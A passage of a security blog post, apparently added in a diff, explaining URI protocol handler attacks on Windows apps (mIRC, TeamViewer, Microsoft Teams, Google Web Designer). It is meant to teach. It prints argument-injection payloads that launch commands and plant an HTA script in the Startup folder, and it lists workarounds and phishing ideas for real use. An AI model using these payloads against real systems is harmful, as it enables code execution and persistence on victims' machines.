+</h1><p>We can also pass remote files to the target app via these URI handlers. It's an
+old technique. I learned it from Raymond Chen's blog post
+<a href="https://devblogs.microsoft.com/oldnewthing/20060509-30/?p=31263" target=_blank rel="noreferrer noopener">subtle ways your innocent program can be Internet-facing</a>
+written in 2006.</p>
+<blockquote>
+<p><p>Of course, the attacker also controls the contents of the file, so any
+vulnerabilities in your file parser can be exploited as well.</p>
+<p>Code injection via file contents is an elevation of privilege.</p>
+</p>
+<footer>
+<strong>Raymond Chen</strong>
+<cite>
+<a href="https://devblogs.microsoft.com/oldnewthing/20060509-30/?p=31263" title="https://devblogs.microsoft.com/oldnewthing/20060509-30/?p=31263">devblogs.microsoft.com/...</a>
+</cite>
+</footer>
+</blockquote>
+<h2 id=unc-paths>UNC Paths
+<a class=header-link href=#unc-paths><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>On Windows, we usually use UNC (Universal Naming Convention) paths to reference
+remote files. They look like <code>\\server\path\to\file</code>.</p>
+<p>In my proofs-of-concept, I use a local share but in the real world you can set up
+a remote server with an open share and host your malicious files.</p>
+<p>To know more about UNC paths please read the <code>UNC Absolute</code> section of
+<a href=https://github.com/tyranid target=_blank rel="noreferrer noopener">James Forshaw's</a> excellent article
+<a href=https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32-to-nt.html target=_blank rel="noreferrer noopener">The Definitive Guide on Win32 to NT Path Conversion</a>. I have
+read it a few times but I mostly treat it as a reference and read specific
+sections when I have a problem.</p>
+<h2 id=cve-2019-6453---rce-on-mirc-using-argument-injection-through-custom-uri-protocol-handlers-by-proofofcalc>CVE-2019-6453 - RCE on mIRC Using Argument Injection Through Custom URI Protocol Handlers by @ProofOfCalc
+<a class=header-link href=#cve-2019-6453---rce-on-mirc-using-argument-injection-through-custom-uri-protocol-handlers-by-proofofcalc><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Take some time to read the write-up at
+<a href=https://proofofcalc.com/cve-2019-6453-mIRC/ target=_blank rel="noreferrer noopener">https://proofofcalc.com/cve-2019-6453-mIRC/</a>.</p>
+<p>The protocol handler for mIRC was setup like
+<code>"C:\Program Files (x86)\mIRC\mirc.exe" %1</code> and you could pass command-line
+switches to the app. The <code>-i</code> switch runs a configuration file on startup. That
+config file can specify script files and execute them. These script files can
+execute code and spawn new processes.</p>
+<p>The authors combined the URL handler vuln with a remote configuration file. They
+created a link with a UNC path to a remote config file. The link looks like
+<code>&lt;iframe src='irc://? -i\\127.0.0.1\C$\mirc-poc\mirc.ini' /></code> and runs
+<code>mirc.exe -i \\127.0.0.1\C$\mirc-poc\mirc.ini</code>.</p>
+<p>mIRC loads the remote config file on startup. The config file has a section
+where a separate remote script is mentioned. mIRC loads and executes that script
+file. The script file then runs code.</p>
+<h3 id=the--->The <code>--</code>
+<a class=header-link href=#the---><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><p>Let's talk a little bit about the <code>--</code> mentioned in the previous bug.
+Command-line switches come in three flavors: named arguments, positional
+arguments, and flags. In <code>parse.exe --verbose --config file.cfg myfile</code> we have:</p>
+<ul>
+<li><code>--verbose</code> is a flag. If the flag exists its value is <code>true</code>.</li>
+<li><code>--config</code> is a named argument with value <code>file.cfg</code>.</li>
+<li><code>myfile</code> is a positional argument. It's parsed based on position.</li>
+</ul>
+<p>Having <code>--</code> in the arguments means everything after that will be treated as a
+positional argument so we cannot pass named arguments anymore. Let's say the
+protocol handler for our app is <code>app.exe %1</code> and we need to accept a positional
+argument from the URI. Attackers can pass extra command-line switches to the app
+and do bad things. But using <code>app.exe -- "%1"</code> means everything will be treated
+as a positional argument.</p>
+<p>This is not a silver bullet. The app might process the string and extract
+arguments from it. Even if we can avoid all named arguments, apps usually accept
+a positional argument that is a file they load. Thus, the app might still be
+vulnerable when we pass a malicious remote file to it.</p>
+<h2 id=cve-2020-13699---unquoted-uri-handler-in-teamviewer-by-jeffssh>CVE-2020-13699 - Unquoted URI handler in TeamViewer by @Jeffssh
+<a class=header-link href=#cve-2020-13699---unquoted-uri-handler-in-teamviewer-by-jeffssh><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Another avenue of attack is passing remote files and capturing NTLM credentials.
+This is a topic that I do not know much about so feel free to correct me here.
+Do we get to capture NTLM credentials every time we let an app open a remote
+share?! Is it always bad? I do not know.</p>
+<p><a href=https://jeffs.sh/CVEs/CVE-2020-13699.txt target=_blank rel="noreferrer noopener">Unquoted URI handler in the TeamViewer Windows Desktop Application</a>
+by <a href=https://twitter.com/jeffssh target=_blank rel="noreferrer noopener">Jeffrey Hofmann</a> does this. In short, you can create a URI
+scheme and make the Teamviewer app open a remote share and capture the NTLM
+credentials send by the OS.</p>
+<h1 id=command-line-switch-injection>Command-Line Switch Injection
+<a class=header-link href=#command-line-switch-injection><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Depending on how the app processes these passed parameters, it might be possible
+to sneak a command via a command-line switch.</p>
+<h2 id=electron-and-cef-command-line-injections-by-rgod>Electron and CEF command-line Injections by rgod
+<a class=header-link href=#electron-and-cef-command-line-injections-by-rgod><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p><code>rgod</code> or if I am not mistaken <a href=http://retrogod.altervista.org/ target=_blank rel="noreferrer noopener">Andrea Micalizzi</a> found a ton
+of these command injections. They could inject commands in <a href=https://www.electronjs.org/ target=_blank rel="noreferrer noopener">Electron</a>
+and <a href=https://bitbucket.org/chromiumembedded/cef/src target=_blank rel="noreferrer noopener">Chromium Embedded Framework (CEF)</a> apps from the URI.</p>
+<p>This ZDI article by Vincent Lee
+<a href=https://www.thezdi.com/blog/2018/12/18/top-5-day-two-electron-boogaloo-a-case-for-technodiversity target=_blank rel="noreferrer noopener">Top 5 Day Two: Electron Boogaloo - a Case for Technodiversity</a>
+explores these bugs in detail.</p>
+<p>The ZDI advisory pages don't contain any details so I am not linking to them.
+It's very disappointing. We can only learn about these disclosed and fixed bugs
+from the end-of-the-year blog post. That said, it's their bugs and they can do
+whatever they want with them.</p>
+<h3 id=microsoft-teams-command-injection>Microsoft Teams Command Injection
+<a class=header-link href=#microsoft-teams-command-injection><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><p>In the Microsoft Teams exploit rgod passed a parameter named <code>gpu-launcher</code> to
+the app.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#268bd2>iframe</span> src<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;msteams://?&#34;
+</span><span style=color:#2aa198>  --disable-gpu-sandbox
+</span><span style=color:#2aa198>  --no-sandbox
+</span><span style=color:#2aa198>  --gpu-launcher=&#34;cmd.exe /c start calc | pause
+</span><span style=color:#2aa198>&#39;</span>&gt;
+</code></pre></div><ul>
+<li><a href=https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc#414 target=_blank rel="noreferrer noopener">gpu-launcher</a> is a Chromium command-line switch that
+launches a new process. In this case, it's the GPU process for Chromium.</li>
+<li><a href=https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc#118 target=_blank rel="noreferrer noopener">disable-gpu-sandbox</a> disables the GPU process
+sandbox (d'oh) which I assume allows the GPU process to do whatever.</li>
+<li><a href=https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc#463 target=_blank rel="noreferrer noopener">no-sandbox</a> "disables the sandbox for all process types
+that are normally sandboxed."</li>
+</ul>
+<p>The
+<a href=https://www.electronjs.org/blog/protocol-handler-fix target=_blank rel="noreferrer noopener">Electron framework was passing the Chromium switches directly</a>
+from the URI to the instances. The beauty of finding a framework exploit is
+being able to hit multiple applications with one stone. The
+<a href=https://thewhiteh4t.github.io/2018/11/16/ubisoft-uplay-rce-exploit.html target=_blank rel="noreferrer noopener">Ubisoft Uplay Desktop Client</a> and the <a href=https://hackernoon.com/exploiting-electron-rce-in-exodus-wallet-d9e6db13c374 target=_blank rel="noreferrer noopener">Exodus wallet</a> had
+similar issues.</p>
+<h3 id=google-web-designer-command-injection-via-the-log-file>Google Web Designer Command Injection via The Log File
+<a class=header-link href=#google-web-designer-command-injection-via-the-log-file><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><p>The Google Web Designer bug is more complex and a neat trick. It took me 30
+minutes and a few rabbit holes to figure it out.</p>
+<blockquote>
+<p>However, we have not seen any public PoC using the exploit techniques
+demonstrated by rgod in his other submissions. In the submission for ZDI-18-552
+affecting Google Web Designer, he had exploited three other command-line options
+to inject a .hta HTML Application file into the log file. The log file is
+controlled by the attacker and placed in the startup directory of the victim's
+machine</p>
+<footer>
+<strong>Vincent Lee</strong>
+<cite>
+<a href=https://www.thezdi.com/blog/2018/12/18/top-5-day-two-electron-boogaloo-a-case-for-technodiversity title=https://www.thezdi.com/blog/2018/12/18/top-5-day-two-electron-boogaloo-a-case-for-technodiversity>thezdi.com/blog/2018/12/18/...</a>
+</cite>
+</footer>
+</blockquote>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#268bd2>a</span> href<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;gwd-template://?&#34;
+</span><span style=color:#2aa198>  --type=&#34;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
+</span><span style=color:#2aa198>    &lt;script&gt; var x=new ActiveXObject(\&#34;WScript.Shell\&#34;); x.Exec(\&#34;calc.exe\&#34;);&lt;/script&gt;&#34;
+</span><span style=color:#2aa198>  --no-sandbox
+</span><span style=color:#2aa198>  --log-file=
+</span><span style=color:#2aa198>    &#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/suntzu.hta&#34;
+</span><span style=color:#2aa198>  --log-severity=verbose /&#39;</span>&gt;
+  clickme
+&lt;/<span style=color:#268bd2>a</span>&gt;
+</code></pre></div>
+<h4 id=the-type-switch>The type Switch
+<a class=header-link href=#the-type-switch><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>According to the <a href=https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc#507 target=_blank rel="noreferrer noopener">source code</a>, the <code>type</code> switch sets the process
+type. Originally, I thought there was an injection vulnerability when this
+switch was processed. The payload looks like a typical XSS payload.
+We are injecting JScript (think Microsoft's JavaScript) after all. This value is
+directly written to the log file.</p>
+<span class=caption-wrapper>
+<img class=caption src=03-gwd-poc.png title="Google Web Designer POC Image. Image credit: ZDI blog" alt="Google Web Designer POC Image. Image credit: ZDI blog">
+<span class=caption-text>Google Web Designer POC Image. Image credit: ZDI blog</span>
+</span>
+<p>Alt text for this image:</p>
+<pre tabindex=0><code>Screenshot of a Windows machine. It shows several windows. The top left is an
+Internet Explorer page with parts of the address bar visible
+&quot;http://172.16.51.1:8080/poc.html&quot; which is most likely the HTML file from the
+previous picture opened in IE.
+
+Under that (still, top left) is an instance of the Windows calculator. This is
+what they call &quot;popping calc&quot; which is executing calculator to show command
+execution.
+
+The top right is the typical Windows error dialog for &quot;Google Web Designer.&quot; It says
+&quot;Google Web designer has stopped working&quot; and has the buttons that &quot;check for a
+solution online&quot; or &quot;close the program&quot;.
+
+The bottom right is a log file opened in notepad. It is the HTA app from the
+previous payload. It has some logs about the Google web designer app.
+</code></pre><p>Look at the contents of the log file (opened as an HTA app) in the picture above
+(I added a red rectangle to highlight the location I am talking about). In some
+old <a href=https://chromium.googlesource.com/aosp/platform/external/libchrome/+/refs/heads/stabilize-8530.93.B/base/metrics/histogram_base.cc#136 target=_blank rel="noreferrer noopener">Chromium source code</a>, we can see how this log
+entry is created (it's does not exist in
+<a href=https://chromium.googlesource.com/aosp/platform/external/libchrome/+/refs/heads/master/base/metrics/histogram_base.cc target=_blank rel="noreferrer noopener">the current version</a>):</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#dc322f>void</span> HistogramBase<span style=color:#719e07>::</span>EnableActivityReportHistogram(
+    <span style=color:#719e07>const</span> std<span style=color:#719e07>::</span>string<span style=color:#719e07>&amp;</span> process_type) {
+  DCHECK(<span style=color:#719e07>!</span>report_histogram_);
+  <span style=color:#586e75>// Code removed
+</span><span style=color:#586e75></span>  std<span style=color:#719e07>::</span>string name <span style=color:#719e07>=</span>
+      <span style=color:#2aa198>&#34;UMA.Histograms.Activity&#34;</span> <span style=color:#719e07>+</span>
+      (process_type.empty() <span style=color:#719e07>?</span> process_type : <span style=color:#2aa198>&#34;.&#34;</span> <span style=color:#719e07>+</span> process_type); <span style=color:#586e75>// &lt;--- Injection
+</span><span style=color:#586e75></span>  <span style=color:#586e75>// Comment removed
+</span><span style=color:#586e75></span>  report_histogram_ <span style=color:#719e07>=</span> LinearHistogram<span style=color:#719e07>::</span>FactoryGet(
+      name, <span style=color:#2aa198>1</span>, HISTOGRAM_REPORT_MAX, HISTOGRAM_REPORT_MAX <span style=color:#719e07>+</span> <span style=color:#2aa198>1</span>,
+      kUmaTargetedHistogramFlag);
+  report_histogram_<span style=color:#719e07>-&gt;</span>Add(HISTOGRAM_REPORT_CREATED);
+}
+</code></pre></div><p>The <code>name</code> string contains the type of the process. It is injected with the
+<code>type</code> switch and then reflected as-is in the log file.</p>
+<h4 id=the-payload>The Payload
+<a class=header-link href=#the-payload><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>The payload runs the Windows calculator. It's written in JScript.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#268bd2>var</span> x<span style=color:#719e07>=</span><span style=color:#719e07>new</span> ActiveXObject(<span style=color:#2aa198>&#34;WScript.Shell&#34;</span>);
+x.Exec(<span style=color:#2aa198>&#34;calc.exe&#34;</span>);
+</code></pre></div><p>We have complete control here and unlike <code>Process.Start</code> above we are not
+limited to just running executables. We can provide our parameters and pretty
+much do anything. HTAs also support VBScript like this
+<a href=https://github.com/arntsonl/calc_security_poc/blob/master/hta/calc.hta target=_blank rel="noreferrer noopener">proof of concept</a> by my old colleague Luke Arntson.</p>
+<h4 id=the-log-file>The Log File
+<a class=header-link href=#the-log-file><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>The <code>log-file</code> switch does not appear in the current Chromium or CEF switches.
+It was probably removed? It's pointing to the location of the log file.</p>
+<p><code>C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/suntzu.hta</code></p>
+<p><code>STARTM~1</code> is the shortpath notation for <code>Start Menu</code>. The payload uses the good
+ole' <code>8.3</code> notation to avoid having spaces in the path. Shortpath also works on
+directories because directory names are stored as a
+<a href="https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#:~:text=Note%20that%20directory%20names%20are%20stored%20by%20the%20file%20system%20as%20a%20special%20type%20of%20file," target=_blank rel="noreferrer noopener">special type of files</a>.</p>
+<p>It's the startup directory for the administrator. Every time the user logs on,
+the contents of the directory are executed. This includes the injected HTA file.</p>
+<p><code>log-severity</code> appears to have been replaced with <code>log-level</code>. Setting it to
+<code>verbose</code> almost certainly added those messages with the process type to the
+log file.</p>
+<h4 id=how-does-this-work>How Does This Work?
+<a class=header-link href=#how-does-this-work><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>There are two main questions:</p>
+<ol>
+<li>The payload has garbage logs around it. How does it get parsed correctly?</li>
+<li>How is the HTA file executed every time the user logs on?</li>
+</ol>
+<p>To answer both, we are going to replicate this in a VM. Store the following in a
+file named <code>whatever.hta</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>Text before the payload.
+&lt;<span style=color:#268bd2>script</span>&gt;
+  <span style=color:#268bd2>var</span> x<span style=color:#719e07>=</span><span style=color:#719e07>new</span> ActiveXObject(<span style=color:#2aa198>&#34;WScript.Shell&#34;</span>);
+  x.Exec(<span style=color:#2aa198>&#34;calc.exe&#34;</span>);
+&lt;/<span style=color:#268bd2>script</span>&gt;
+
+Text after the payload.
+</code></pre></div><p>Now we can run this file by double-clicking on it. HTA files are executed by
+<code>mshta.exe</code> and contain HTML apps. Inside these apps, you can have more than
+just normal JavaScript. For more information, please see
+<a href="https://docs.microsoft.com/en-us/previous-versions//ms536496%28v=vs.85%29" target=_blank rel="noreferrer noopener">Introduction to HTML Applications (HTAs) on docs.microsoft.com</a>,
+especially the section named <code>The Power of Trust: HTAs and Security</code>.</p>
+<span class=caption-wrapper>
+<img class=caption src=05-hta-executed.png title="whatever.hta executed" alt="whatever.hta executed">
+<span class=caption-text>whatever.hta executed</span>
+</span>
+<p>Because they are HTML applications the text before and after the script is
+treated like, well, text. The script is executed. Hence why you do not see it in
+the resulting page. We can see the processes in procmon:</p>
+<span class=caption-wrapper>
+<img class=caption src=06-hta-procmon.png title="whatever.hta in procmon" alt="whatever.hta in procmon">
+<span class=caption-text>whatever.hta in procmon</span>
+</span>
+<p>To explore more, put it in the <code>Start Up</code> directory for your user at:</p>
+<p><code>%appdata%/Microsoft/Windows/STARTM~1/Programs/Startup/</code></p>
+<p>Now, run the <code>logoff</code> command in your VM and log in again. A few seconds after
+login you should see the HTA app and calc.</p>
+<p>All 22 closing brackets appear in the log and none of them are used up. At
+first, I thought they are pointing to the location of the payload in the log
+file (think arrows) but now, I think they are there to get out of anything in
+the log that might be interpreted as an HTML tag by the parser.</p>
+<p>Brilliant bug! Don't forget to remove the HTA file from your VM.</p>
+<h4 id=startup-path-limitations-and-possible-workarounds>Startup Path Limitations And Possible Workarounds
+<a class=header-link href=#startup-path-limitations-and-possible-workarounds><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>Update 29 April 2021. I have used this technique in a couple of real-world bugs.
+Let's look at the path:</p>
+<ul>
+<li><code>C:/Users/[username]/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/suntzu.hta</code></li>
+</ul>
+<p>We need to predict the <code>[username]</code>. rgod's proof of concept gets around this by
+using <code>Administrator</code>. This is a user that exists on most Windows machines but
+to inject into that location the app needs to be running elevated.</p>
+<p>I have thought of some workarounds:</p>
+<ol>
+<li>Environment variables.</li>
+<li>Multi-stage payloads.</li>
+<li>Startup in ProgramData.</li>
+<li>Guessing the username.</li>
+</ol>
+<h5 id=environment-variables>Environment Variables
+<a class=header-link href=#environment-variables><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h5><p>If the path supports environment variables we can substitute the path with
+either (and possibly more):</p>
+<ul>
+<li><code>%appdata%/Microsoft/Windows/STARTM~1/Programs/Startup/</code></li>
+<li><code>C:/Users/%username%/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/</code></li>
+</ul>
+<p>It does not always work. I had this vuln in a C# app. Passing a path with an
+environment variable in it to C# file utilities is not enough and they must be
+resolved with <a href=https://docs.microsoft.com/en-us/dotnet/api/system.environment.expandenvironmentvariables target=_blank rel="noreferrer noopener">Environment.ExpandEnvironmentVariables(String)</a>.</p>
+<h5 id=multi-stage-payloads>Multi-stage Payloads
+<a class=header-link href=#multi-stage-payloads><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h5><p>You might be able to be successful if you can inject in a different path. Maybe,
+a different application executes or uses the file or you can execute single
+files.</p>
+<p>In the application mentioned above, I could also execute single files without
+parameters. This is a limitation that we have seen a few times in this article
+and the wild.</p>
+<p>I injected the HTA into <code>C:/ProgramData/[app]</code> and then executed it using the
+original vulnerability.</p>
+<h5 id=startup-in-programdata>Startup in ProgramData
+<a class=header-link href=#startup-in-programdata><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h5><p>If you are running elevated you can inject into
+<code>C:/ProgramData/Microsoft/Windows/STARTM~1/Programs/Startup/</code> and it will be
+executed at startup for all users.</p>
+<p>The big limitation here is running elevated. Writing to that directory needs
+local admin.</p>
+<h5 id=guessing-the-username>Guessing The Username
+<a class=header-link href=#guessing-the-username><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h5><p>If all else fails, just guess.</p>
+<p>In most businesses, the person's username and their email is the same and
+predictable (e.g., <code>jsmith</code> for John Smith).</p>
+<p>We can send targeted phishing emails to users with a customized payload in the
+protocol handler and have a good success rate.</p>
+<h3 id=skype-command-injection-via-browser-subprocess-command>Skype Command Injection via browser-subprocess-command
